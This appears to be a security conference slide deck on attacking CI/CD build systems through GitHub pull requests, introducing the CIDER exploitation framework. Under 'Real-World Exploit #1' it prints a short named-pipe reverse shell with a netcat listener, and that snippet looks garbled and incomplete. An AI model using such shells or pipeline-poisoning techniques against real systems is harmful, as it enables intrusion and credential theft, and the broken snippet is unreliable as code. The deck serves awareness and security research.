# Exploiting Continuous Integration (CI) and Automated Build Systems: Introducing CIDER

## Whoami
- **Name:** SpaceB0x
- **Role:** Senior Security Engineer at LeanKit
- **Expertise:** Application and network security (offense and defense)
- **Interests:** Breaking into systems, building systems, and learning
- **Experience:** Security consultant

## Agenda
1. Overview of Continuous Integration concepts
2. Configuration Vulnerabilities vs. Application Vulnerabilities
3. Real-world exploit #1
4. Common Bad-practices
5. Real-world exploit #2 – Attacking the CI provider
6. Introduction to CIDER

## Continuous Integration (CI)
- **Definition:** Quick iterative release of code to production servers.
- **Frequency:** Multiple iterations per week or even per day.
- **Repository-centric:** In sync with automated build processes.
- **Scope:** For infrastructure, servers, subnets, etc.

### Microservices
- **Concept:** Breaking down large applications into small, decoupled components.
- **Interaction:** These components interact with each other.
- **Benefits:** Eliminates single points of failure and enables autonomous development.

## Security Implications
### Positive Aspects
- **Frequent Release Cycles:** Facilitate rapid deployment and quick remediation.
- **Decoupled Systems:** Reduce single points of failure.
- **Compromise Mitigation:** Compromising one service doesn't always mean full system compromise.

### Negative Aspects
- **Hasty Oversights:** Fast releases can lead to oversight in security checks.
- **Automated Deployment Oversight:** Automated deployment systems are often less scrutinized than the code they deploy.

## Tools
### Build Systems
- **Functionality:** Take code and build it conditionally.
- **Environment:** Typically in a quasi-containerized environment.
- **Popular Vendors:**
  - Travis-CI
  - Circle-CI
  - Drone
  - TeamCity
  - BuildKite

### Deployment Systems
- **Functionality:** Deploy the code after the build process.
- **Trend:** Moving towards container-driven deployments.
- **Popular Vendors:**
  - Jenkins
  - Octopus Deploy
  - Kubernetes
  - Rancher
  - Mesosphere

## Chains of Deployment
- **Checks in the SDLC:**
  - Build tests before merges.
  - Web-hooks trigger specific actions based on conditions.
  - Services configured without regard to one another.

### Configuration Problems
- **GitHub Attack Surface:**
  - Pull requests and commits trigger builds.
  - Build configurations are usually in the root of the repository.
  - Build configuration changes can be part of PRs or commits.
  - Potential to gain control of multiple systems through pull requests.

- **Vulnerabilities in Misconfiguration:**
  - Creative configuration exploitation.
  - Vulnerability stacking.
  - Individual services may function as intended, but interactions between services can introduce vulnerabilities.

- **External Repositories:**
  - Most volatile attack surface.
  - Public repositories that map to internal build services.

## Real-World Exploit #1
```bash
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe
nc –l 4444
```

## Bad Practices
- **Environment Variables:**
  - Used to store credentials.
  - Storing metadata for other services within micro-service infrastructure.
- **Running Everything as Root:**
  - Just a container, right?
  - Provides internal network access.
  - Full control to build and augment the image.
- **CI Provider Info Leak:**
  - Issues with CI providers themselves.
  - Leaking SSH keys, which can compromise other customers on the host.
  - CI providers have at least some permissions to GitHub repos.
  - Cloud-based CI providers have a hosting environment.

## Real-World Exploit #2
- **Details to be discussed.**

## Introducing CIDER
### What is CIDER?
- **Definition:** Continuous Integration and Deployment Exploiter.
- **Framework:** For exploiting and attacking CI build chains.
- **Attack Surface:** Mainly leverages GitHub to get to build services.
- **Features:**
  - Simplifies forking, PR-ing, and callbacking.
  - Poisons a handful of build services and "exploits" for each one.

### Why CIDER?
- **Fun and Ease of Use:** Makes attacking easy.
- **Awareness:** Raises awareness about CI/CD vulnerabilities.
- **Research Facilitation:** Supports further research.
- **Inspiration:** Inspired by RottenApple by @claudijd.

### CIDER Overview
- **Commands:**
  - `help`
  - `add target` and `list targets`
  - `load` and `info`

### CIDER Features
- **Language:** Node.JS
- **Modularity:** Built modularly.
- **Bulk Handling:** Can handle bulk lists of target repositories.
- **Cleanup:** Manages GitHub repo craziness.
- **Ngrok:** Facilitates port forwarding and public IP management.

## Disclaimer
- **GitHub User Agreement:** Testing against a repository, even with owner permission, is against the user agreement.
- **Ownership Requirement:** You must be the owner to test a repository.
- **Recommendation:** Ask the owner to make you an owner when testing.

## Demo
- **Details to be demonstrated.**

## Limitations
- **Build Queues**
- **GitHub Noise**
- **Timeouts**
- **Repo API Request Throttling**

## Future Work
- **More CI Frameworks**
- **Deployment Services**
- **Exploring Other Entry Points**
- **Other Code Repositories**
- **ChatOps (Slack)**

## Thanks
- **LeanKit Operations Team**
- **Evan Snapp**
- **@claudijd**

## Fin
- **CIDER on GitHub:** [https://github.com/spaceB0x/cider](https://github.com/spaceB0x/cider)
- **Twitter:** @spaceB0xx
- **Website:** [www.untamedtheory.com](http://www.untamedtheory.com)